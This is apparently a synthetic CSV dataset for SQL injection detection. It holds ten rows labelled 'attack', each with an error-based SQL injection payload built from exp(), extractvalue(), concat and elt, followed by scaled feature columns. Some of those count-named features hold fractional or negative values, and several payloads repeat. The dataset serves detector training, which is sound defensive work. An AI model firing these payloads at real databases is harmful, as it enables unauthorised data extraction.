id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000598,4.729024457941464,167.95053100585938,63.64786911010742,25.76357650756836,66.16190338134766,10.906091690063477,71.39604187011719,30.481273651123047,1.1182080507278442,0.2758875787258148,0.19059143960475922,0.37433674931526184,0.13068842887878418,3.6552743911743164,2.039059638977051,1.74989914894104,0.6591012477874756,0.19586805999279022,0.06488107889890671,0.21059875190258026,4.669734477996826,5.209287166595459,5.244693279266357,-0.22602799534797668,1.3835291862487793,0.11821254342794418,-0.19923698902130127,0.058987781405448914,0.12113399058580399,1.027428150177002,-0.5249170660972595,-0.2988165020942688,2.526188611984253,-0.0514572411775589,0.1641608327627182,1.9756677150726318,4.271358489990234,0.5642476081848145,1.431371808052063,0.43924859166145325,0.23790238797664642,0.9069202542304993,0.21712389588356018,0.14766430854797363,0.21143853664398193,-0.06046626716852188,0.16073063015937805,0.3196686804294586,0.08430033922195435,-0.0889272689819336,0.21777303516864777,0.24368536472320557,-0.198410764336586,0.6372133493423462,0.3933512568473816,0.176778182387352,0.17574569582939148,0.37369534373283386,-0.2785899043083191,0.29304683208465576,-0.4154070019721985,-0.36034876108169556,0.17552617192268372,-0.18585360050201416,0.1351768523454666,-0.062035802751779556,1.0213053226470947,-0.0672396570444107,0.12452365458011627,0.21993757784366608,-0.2963595986366272,-0.10628513991832733,-0.17460906505584717,0.1137697622179985,0.0019144959514960647,-0.011915361508727074,1.1262089014053345,0.35545557737350464,-0.19874408841133118,-0.04437527433037758,0.11830078065395355,6.435259819030762,0.20704686641693115,0.1962612122297287,0.10483723878860474,0.8786356449127197,-0.009665824472904205,0.2844792306423187,-0.21345782279968262
GAN_000002,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000824,5.818182056667722,143.4141387939453,58.36604309082031,24.20922088623047,64.41252136230469,11.015920639038086,87.18785858154297,21.85124969482422,0.6980115175247192,0.273432195186615,0.20616810023784637,0.3609664738178253,0.12690526247024536,3.737565040588379,2.076073408126831,1.7534373998641968,-0.16436050832271576,0.3562697768211365,0.07582050561904907,0.6976065039634705,5.1150102615356445,4.219666481018066,5.21578311920166,-0.5360127091407776,1.3480538129806519,0.2827395498752594,-0.9707689881324768,-0.12993746995925903,0.17855656147003174,0.868804395198822,-0.4992447793483734,-0.5661069750785828,2.7718379497528076,-0.6461467742919922,-0.04313785582780838,2.0039682388305664,5.560675144195557,0.8672181367874146,1.163465976715088,0.5038962960243225,0.1073443740606308,1.3328689336776733,0.057974573224782944,0.1528315246105194,0.3759797513484955,-0.546258807182312,0.5985509157180786,0.3769892156124115,0.31524837017059326,0.04076376557350159,0.4264231324195862,-0.11628037691116333,0.08977826684713364,0.6255408525466919,0.39945265650749207,0.23995113372802734,0.15205860137939453,0.4969862997531891,-0.559578001499176,0.2936984598636627,-0.4079444706439972,-0.7224622964859009,0.12871013581752777,-0.1983020007610321,0.06113288179039955,-0.21202212572097778,0.8439012169837952,0.3285311758518219,0.15645498037338257,0.2792675197124481,-0.5960851907730103,0.2973887324333191,-0.17883431911468506,-0.07459990680217743,-0.0011096677044406533,-0.028420766815543175,1.0714836120605469,0.341580331325531,-0.1474822759628296,0.15775464475154877,0.3052516579627991,6.223674774169922,0.16457518935203552,0.21024882793426514,0.2507837116718292,0.9348757266998291,0.281669557094574,0.10650444775819778,-0.21764937043190002
GAN_000003,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.717815056859789,185.00250244140625,67.02352905273438,33.50600051879883,88.4599609375,6.79611873626709,81.7083511352539,31.50364112854004,0.7796503305435181,0.2686835527420044,0.18800748884677887,0.3748469948768616,0.1342083066701889,3.693633556365967,2.0684921741485596,0.9319524765014648,0.43697836995124817,0.22380904853343964,0.02707052417099476,0.43025675415992737,5.9540629386901855,7.864165306091309,4.772960186004639,-0.2636144161224365,1.5024334192276,0.18970414996147156,-0.6031895875930786,0.11191658675670624,0.04289092868566513,0.8165836334228516,-0.4523758888244629,-0.5010451078414917,2.5476131439208984,-0.12841826677322388,0.16051878035068512,2.0057458877563477,6.6023430824279785,0.8955618143081665,1.5432567596435547,0.384835809469223,0.2376638650894165,1.0349456071853638,0.2843818664550781,0.09982885420322418,0.24322107434272766,-0.04736708849668503,0.38437148928642273,0.3039422929286957,0.32335278391838074,0.1466764509677887,0.3107083737850189,0.1389458179473877,0.19298812747001648,0.13024313747882843,0.3325197100639343,0.15338435769081116,0.2056473344564438,0.24019314348697662,-0.40950801968574524,0.20504756271839142,-0.3492029905319214,-0.6207879781723022,0.06152493506669998,-0.053404226899147034,0.0849485695362091,-0.08791555464267731,0.7957981824874878,-0.12325572222471237,0.07233938574790955,0.20992852747440338,-0.18302017450332642,0.0728340670466423,-0.156296044588089,0.0770246684551239,-0.01130949892103672,-0.014687176793813705,1.1908866167068481,0.3942945897579193,-0.13386458158493042,0.1546398103237152,0.2634836435317993,7.694680213928223,0.3809228539466858,0.19803351163864136,0.13601866364479065,0.7195634245872498,0.04136371612548828,0.11867263168096542,-0.036945417523384094
GAN_000004,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.861576399705131,193.40220642089844,63.46354675292969,30.193191528320312,78.6129150390625,11.139350891113281,80.28565216064453,28.08290672302246,0.8084378838539124,0.28733909130096436,0.1843463033437729,0.37885069847106934,0.12889878451824188,3.735098123550415,1.6005884408950806,1.1841803789138794,0.2446306198835373,0.21426188945770264,0.04600759595632553,0.27226880192756653,5.888972282409668,6.600574016571045,4.269674301147461,-0.11072229593992233,1.5457022190093994,0.17356494069099426,-0.4422023296356201,0.14783994853496552,0.0742771327495575,0.692312479019165,-0.3302287757396698,-0.1643589735031128,2.353020191192627,-0.44587209820747375,0.11088446527719498,2.0684146881103516,6.652675151824951,0.933010458946228,1.5578800439834595,0.5606497526168823,0.1462964564561844,1.0917433500289917,0.3009001612663269,0.10653858631849289,0.2564808130264282,-0.26759764552116394,0.2781962454319,0.30331867933273315,0.2691439986228943,0.043349236249923706,0.3558531105518341,0.122630774974823,-0.10346187651157379,0.43496644496917725,0.3983999192714691,0.1396499127149582,0.14322321116924286,0.2277529537677765,-0.4408443570137024,0.1467936933040619,-0.21389079093933105,-0.6488739252090454,0.04160822927951813,-0.1683647632598877,0.1826954483985901,-0.16038022935390472,0.829325258731842,0.030501000583171844,-0.021416787058115005,0.1343592405319214,-0.07231982052326202,0.16858181357383728,-0.2948327958583832,0.02822093665599823,0.0018418495310470462,-0.011558173224329948,1.0445502996444702,0.471893846988678,0.005797617137432098,0.161701962351799,0.33362260460853577,7.560176849365234,0.26754817366600037,0.16992847621440887,0.19381897151470184,0.7986589670181274,0.05632134526968002,0.012808451429009438,-0.23735198378562927
GAN_000005,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,5.3620847014681745,137.02597045898438,68.37334442138672,26.657140731811523,64.69754791259766,13.56661319732666,71.25629425048828,29.405033111572266,1.3236761093139648,0.24905270338058472,0.1835213303565979,0.3637731075286865,0.12995070219039917,3.5626070499420166,2.144710063934326,1.204833745956421,0.8998810052871704,0.12279905378818512,-0.07042288780212402,-0.18169093132019043,4.63637113571167,5.778822422027588,5.435032844543457,-0.21450665593147278,1.4022717475891113,0.07062166184186935,-0.1244657039642334,0.20124578475952148,-0.02218085341155529,0.8159418106079102,-0.7602142691612244,-0.019591517746448517,2.1607306003570557,0.13477565348148346,0.12131542712450027,2.2830255031585693,3.099015712738037,0.056900475174188614,0.941922128200531,0.47951921820640564,0.45296892523765564,1.2032968997955322,0.19251984357833862,0.025125831365585327,0.5015671253204346,0.09444200992584229,0.14485520124435425,0.20369699597358704,0.04005849361419678,-0.15354597568511963,0.014626860618591309,0.49684154987335205,-0.29229944944381714,0.8339816331863403,0.5377014875411987,0.20767252147197723,0.15250922739505768,0.5188519358634949,-0.13185112178325653,0.25624316930770874,-0.33118078112602234,0.3164805769920349,0.31704121828079224,-0.48958760499954224,0.12520436942577362,0.37719863653182983,1.241294503211975,-0.33229297399520874,0.06627632677555084,-0.20220953226089478,-0.632998526096344,-0.3134860396385193,-0.5077105164527893,-0.2891385853290558,-0.03549818694591522,-0.00997641496360302,1.0629565715789795,0.33930063247680664,-0.08345816284418106,-0.23959116637706757,-0.0587446391582489,6.185816287994385,0.31964418292045593,0.2964961528778076,0.040008578449487686,0.6389991044998169,-0.49285101890563965,0.5405042767524719,0.060731060802936554
GAN_000006,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.631864304190488,222.63345336914062,72.42095947265625,35.70491409301758,85.44496154785156,5.657370567321777,77.30213928222656,32.29463195800781,0.7809484004974365,0.28808245062828064,0.17000015079975128,0.3838016986846924,0.1294988989830017,3.7049148082733154,1.7453632354736328,1.0653945207595825,0.4908633232116699,0.07089666277170181,0.0502777025103569,-0.08876900374889374,8.384342193603516,8.533275604248047,3.470571279525757,-0.17335909605026245,1.701400876045227,0.17771637439727783,-0.04122269153594971,0.278854638338089,0.10835274308919907,0.6782820224761963,-0.2333778291940689,-0.14654624462127686,1.8767486810684204,-0.08452382683753967,0.1542024463415146,2.270897150039673,7.359871864318848,1.0435583591461182,1.5676676034927368,0.1486237496137619,0.3721766173839569,1.0206071138381958,0.27092134952545166,0.06781046092510223,0.20799419283866882,-0.048640914261341095,0.19505393505096436,0.3182966709136963,0.3651491403579712,0.3111574053764343,0.4539296329021454,0.3831445872783661,-0.20610983669757843,0.3919501006603241,0.36948835849761963,0.14571382105350494,0.10618452727794647,0.17192836105823517,-0.30934157967567444,0.4425082802772522,-0.07515641301870346,0.009273700416088104,0.18864481151103973,-0.09256021678447723,0.17748099565505981,0.0580257922410965,0.7650583982467651,-0.06611162424087524,0.0002476712688803673,-0.07870220392942429,-0.20767377316951752,-0.10426782071590424,-0.027094677090644836,-0.12703460454940796,-0.016546154394745827,-0.011185141280293465,0.9759677648544312,0.37342503666877747,-0.08768025785684586,0.036793556064367294,0.13322380185127258,7.334718704223633,0.504123330116272,0.15849097073078156,0.1651579588651657,0.7088369131088257,-0.08916565030813217,-0.040723711252212524,0.22711971402168274
GAN_000007,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000400,4.84666429793713,186.6642608642578,64.1092758178711,29.230804443359375,75.6435775756836,7.84139347076416,81.28173828125,29.445100784301758,1.139786720275879,0.2907387912273407,0.19245313107967377,0.3737354576587677,0.12809503078460693,3.7888004779815674,2.0889577865600586,1.2460969686508179,0.23826228082180023,0.2545722424983978,0.0204980056732893,0.15426518023014069,8.006754875183105,5.1977858543396,4.404458045959473,-0.3649246394634247,1.4634870290756226,0.1919187307357788,-0.4965013563632965,-0.05719590187072754,0.0009408803889527917,0.6703006029129028,-0.38362985849380493,-0.3733094334602356,2.6367475986480713,-0.4861548840999603,0.13993139564990997,2.149874687194824,6.939925193786621,1.1310096979141235,1.9237570762634277,0.5291432738304138,0.2585809826850891,0.9190489649772644,0.3920854926109314,0.092672199010849,0.3300624191761017,-0.32458728551864624,0.3004067838191986,0.225858673453331,0.2696802318096161,0.12472444772720337,0.2748718857765198,0.09790578484535217,-0.004112571477890015,0.2399425506591797,0.39941030740737915,0.1504272073507309,0.1872802972793579,0.029253166168928146,-0.4371185004711151,0.5847030282020569,-0.3453735113143921,-0.5387109518051147,0.11772172898054123,-0.14077624678611755,0.1819079965353012,0.01082552969455719,0.920275866985321,-0.011979669332504272,-0.1391190141439438,0.06777183711528778,-0.2209770530462265,0.3569994568824768,-0.041104406118392944,0.0009050443768501282,0.007644255645573139,-0.018611937761306763,0.8608354330062866,0.5918653607368469,-0.14405018091201782,0.18492618203163147,0.31021228432655334,7.696334362030029,0.3488690257072449,0.2027151882648468,0.24670405685901642,1.0019358396530151,0.18476970493793488,0.03514034301042557,-0.05912167206406593
GAN_000008,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000934,4.699939844127181,162.252685546875,67.6047592163086,27.718612670898438,72.47535705566406,11.250116348266602,72.92529296875,31.250368118286133,0.9041189551353455,0.27802908420562744,0.18685369193553925,0.3682880699634552,0.12978224456310272,3.6846110820770264,2.2421658039093018,1.3680161237716675,0.6150894165039062,0.13038349151611328,0.058156367391347885,0.13701379299163818,5.112633228302002,6.342132568359375,5.263164520263672,-0.07849403470754623,1.407461166381836,0.12231920659542084,-0.18582752346992493,0.15150846540927887,0.08616983145475388,0.9235146045684814,-0.5044643878936768,-0.20342108607292175,2.4243991374969482,-0.01879166066646576,0.2631682753562927,2.0024707317352295,4.313542366027832,0.5598664879798889,1.4242668151855469,0.28636598587036133,0.31971094012260437,1.0835562944412231,0.12574639916419983,0.10166745632886887,0.18428513407707214,-0.012060508131980896,0.11191225051879883,0.1977781057357788,0.18390056490898132,-0.03460058569908142,0.21109522879123688,0.25831541419029236,-0.11551892757415771,0.5841361284255981,0.3850054442882538,0.1924794763326645,0.12427081167697906,0.3078191578388214,-0.3237609267234802,0.15297402441501617,-0.28693029284477234,-0.16926991939544678,0.30216485261917114,-0.3201891779899597,0.08174823224544525,-0.015641193836927414,0.9920535087585449,-0.19044438004493713,0.0520443394780159,0.10942860692739487,-0.3802102506160736,-0.12020699679851532,-0.23625317215919495,0.0006596297025680542,-0.02173745259642601,-0.016446847468614578,1.2291643619537354,0.3509458601474762,-0.06046435981988907,-0.08894776552915573,0.06969369947910309,6.562853813171387,0.3160626292228699,0.17862281203269958,0.13115279376506805,0.8212150931358337,-0.0562271922826767,0.3225366175174713,-0.08808375149965286
GAN_000009,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000589,4.852876270084882,207.9288330078125,66.42205047607422,29.91600227355957,78.25949096679688,9.95748233795166,86.3890380859375,30.899608612060547,0.9841722846031189,0.3125608265399933,0.1932378113269806,0.37959951162338257,0.13724982738494873,3.819272518157959,1.8617929220199585,0.6405407786369324,0.10330220311880112,0.24167804419994354,-0.008852693252265453,0.23094552755355835,8.198387145996094,5.673337459564209,3.593212842941284,-0.3365681767463684,1.7218005657196045,0.1702263206243515,-0.4056093394756317,0.14940187335014343,-0.1337762176990509,0.6029760837554932,-0.32007062435150146,-0.3333119750022888,2.3380022048950195,-0.4330223500728607,0.08197731524705887,2.3184173107147217,7.690063953399658,1.2332462072372437,2.001063823699951,0.5814371705055237,0.16899649798870087,0.9324478507041931,0.32431960105895996,0.05432615056633949,0.27107641100883484,-0.18033745884895325,0.18021729588508606,0.24387052655220032,0.17584645748138428,0.17361626029014587,0.3907797336578369,0.26844683289527893,-0.2556196451187134,0.18664175271987915,0.4298381507396698,0.09914606809616089,0.08693759143352509,-0.09344324469566345,-0.22447635233402252,0.5779424905776978,-0.21435314416885376,-0.3789077401161194,0.11656122654676437,0.1285804659128189,0.13708096742630005,-0.0879305824637413,0.7322303056716919,0.20798256993293762,-0.21157120168209076,0.06425376981496811,0.037597790360450745,0.55278080701828,0.03746148943901062,-0.09328965842723846,-0.005457380320876837,-0.01963425613939762,0.7127516269683838,0.6359074711799622,-0.08606211096048355,0.1494896411895752,0.3905295431613922,8.900826454162598,0.4722786247730255,0.19367128610610962,0.24130119383335114,0.9166310429573059,-0.0688793733716011,0.27182918787002563,0.09861614555120468
GAN_000010,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",nearest_attack_euclidean,R000057,5.0400494343185445,172.4110107421875,66.60800170898438,22.610694885253906,65.60369873046875,9.826936721801758,81.00732421875,27.84389305114746,0.8087079524993896,0.2950356900691986,0.1964295357465744,0.36098790168762207,0.13245171308517456,3.783311605453491,2.25282621383667,1.717563509941101,0.17558370530605316,0.16097821295261383,0.0969293937087059,0.20832966268062592,6.051876544952393,4.232578754425049,4.7577948570251465,-0.40272700786590576,1.4973275661468506,0.14751450717449188,-0.3908636271953583,-0.13081496953964233,0.05226219445466995,0.8855428695678711,-0.4366232454776764,-0.23229235410690308,2.3444416522979736,-0.5478615164756775,0.112519271671772,1.9917913675308228,5.808444976806641,0.949634850025177,1.6446391344070435,0.43513745069503784,0.10218584537506104,1.0518766641616821,-0.014627516269683838,0.1551908701658249,0.17253372073173523,-0.2596329152584076,0.32207992672920227,0.2198946624994278,0.15710633993148804,-0.009312033653259277,0.30517610907554626,0.16725844144821167,-0.24368278682231903,0.6813122034072876,0.3885718882083893,0.17831061780452728,0.06146648898720741,0.15279094874858856,-0.18056030571460724,0.4444883465766907,-0.2551998794078827,-0.40752315521240234,0.18224526941776276,-0.30848509073257446,0.07186700403690338,-0.20910924673080444,0.9180541634559631,0.24072334170341492,-0.07793854922056198,0.24309134483337402,-0.42812487483024597,0.37653815746307373,0.03390781581401825,0.006456635892391205,0.009085438214242458,-0.02894929237663746,0.9706919193267822,0.4204331934452057,-0.011520393192768097,-0.04751801863312721,0.25366872549057007,6.743262767791748,0.295276403427124,0.1617969572544098,0.2342446893453598,0.9595414400100708,0.2880861163139343,0.4321596026420593,-0.07222377508878708
